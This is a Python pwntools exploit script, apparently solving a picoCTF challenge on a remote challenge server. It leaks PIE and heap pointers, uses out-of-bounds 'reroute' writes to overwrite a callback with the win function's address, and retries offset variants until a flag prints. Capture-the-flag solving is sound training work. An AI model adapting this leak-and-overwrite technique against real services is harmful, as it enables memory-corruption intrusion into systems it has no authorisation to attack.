#!/usr/bin/env python3
from pwn import *
import re
import sys
import time

HOST = "mysterious-sea.picoctf.net"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 52352

DRAW_OFF   = 0x2260
WIN_OFF    = 0x2460
ORD_OFF    = 0x5080
ROUTES_OFF = 0x18
FINISH_OFF = 0x430
WIDTH      = 16
BOOTSTRAP  = 17

context.log_level = "info"

def s32(x):
    x &= 0xffffffff
    if x & 0x80000000:
        x -= 1 << 32
    return x

def grab(name, text):
    m = re.search(rf"{name}=0x([0-9a-fA-F]+)", text)
    if not m:
        raise RuntimeError(f"No pude encontrar {name} en:\n{text!r}")
    return int(m.group(1), 16)

def recv_prompt(io, timeout=5):
    """
    Lee hasta el prompt coloreado o normal.
    No deja bytes ANSI colgando.
    """
    end = time.time() + timeout
    data = b""

    while time.time() < end:
        try:
            b = io.recv(1, timeout=0.2)
        except EOFError:
            break

        if not b:
            continue

        data += b

        if b"router>" in data:
            time.sleep(0.08)
            try:
                data += io.clean(timeout=0.08)
            except Exception:
                pass
            return data.decode("latin-1", "replace")

    return data.decode("latin-1", "replace")

def cmd(io, line, show=True):
    try:
        io.clean(timeout=0.03)
    except Exception:
        pass

    io.sendline(line.encode())
    out = recv_prompt(io)

    if show:
        print(f"\n[CMD] {line}")
        print(out)
        print(f"[RAW] {out!r}")

    return out

def one_attempt(stage_signed=True, d1=0, d2=0):
    io = remote(HOST, PORT)
    recv_prompt(io)

    cmd(io, "add_order 1 1")

    # Orden igual que el exploit público: replay primero, receipt después.
    replay0 = cmd(io, "replay 0")
    receipt0 = cmd(io, "receipt 0")

    draw_ptr = grab("renderer", replay0)
    renderer = grab("hint", receipt0)

    pie = draw_ptr - DRAW_OFF
    win = pie + WIN_OFF
    order0 = pie + ORD_OFF
    routes = renderer + ROUTES_OFF

    idx1 = ((order0 - routes) // 8) + d1
    idx2 = ((renderer + FINISH_OFF - routes) // 8) + d2

    low = win & 0xffffffff
    high = (win >> 32) & 0xffffffff

    staged_x = (low - WIDTH) & 0xffffffff
    stage_arg = s32(staged_x) if stage_signed else staged_x

    log.info(f"PIE        = {pie:#x}")
    log.info(f"renderer   = {renderer:#x}")
    log.info(f"draw_ptr   = {draw_ptr:#x}")
    log.info(f"win        = {win:#x}")
    log.info(f"order0     = {order0:#x}")
    log.info(f"routes     = {routes:#x}")
    log.info(f"idx1       = {idx1}  d1={d1}")
    log.info(f"idx2       = {idx2}  d2={d2}")
    log.info(f"low32      = {low:#x}")
    log.info(f"high32     = {high:#x} / arg={s32(high)}")
    log.info(f"staged_x   = {staged_x:#x} / arg={stage_arg}")
    log.info(f"stage mode = {'signed' if stage_signed else 'unsigned'}")

    # Stage 1: convertir la orden 0 en orden 17 y preparar x para low32(win).
    cmd(io, f"reroute 0 {idx1} {stage_arg}")

    check = cmd(io, f"receipt {BOOTSTRAP}")

    if not re.search(r"receipt:\s", check) or "hint=0x" not in check:
        print("[!] Stage 1 falló: receipt 17 no existe. Cerrando este intento.")
        io.close()
        return False

    print("[+] Stage 1 OK: receipt 17 existe.")

    # Stage 2: escribir high32(win) y low32(win) sobre finish callback.
    cmd(io, f"reroute {BOOTSTRAP} {idx2} {s32(high)}")

    print(f"\n[CMD] dispatch {BOOTSTRAP}")
    io.sendline(f"dispatch {BOOTSTRAP}".encode())

    time.sleep(0.8)
    out = ""
    try:
        out += io.recvrepeat(timeout=3).decode("latin-1", "replace")
    except Exception:
        pass

    print(out)
    print(f"[RAW DISPATCH] {out!r}")

    m = re.search(r"picoCTF\{[^}]+\}", out)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        io.close()
        return True

    print("[!] Dispatch no imprimió flag.")
    io.close()
    return False

def main():
    variants = []

    # Primero, exactamente como el exploit público: staged_x signed, offsets exactos.
    variants.append((True, 0, 0))

    # Luego unsigned por si el parser de la instancia lo acepta mejor.
    variants.append((False, 0, 0))

    # Fallback pequeño de alineación.
    for d1 in [-1, 1, -2, 2]:
        variants.append((True, d1, 0))
        variants.append((False, d1, 0))

    for d2 in [-1, 1]:
        variants.append((True, 0, d2))
        variants.append((False, 0, d2))

    for i, (signed_mode, d1, d2) in enumerate(variants, 1):
        print("\n" + "=" * 70)
        print(f"[+] Intento {i}: signed={signed_mode}, d1={d1}, d2={d2}")
        print("=" * 70)

        try:
            if one_attempt(stage_signed=signed_mode, d1=d1, d2=d2):
                return
        except Exception as e:
            print(f"[!] Error en intento {i}: {e}")

        time.sleep(0.25)

    print("\n[!] No salió.")
    print("[!] Pásame la salida de un intento donde diga 'Stage 1 OK' pero dispatch no imprima flag.")
    print("[!] Si ninguno dice 'Stage 1 OK', pásame la salida RAW de receipt 0, replay 0 y receipt 17.")

if __name__ == "__main__":
    main()
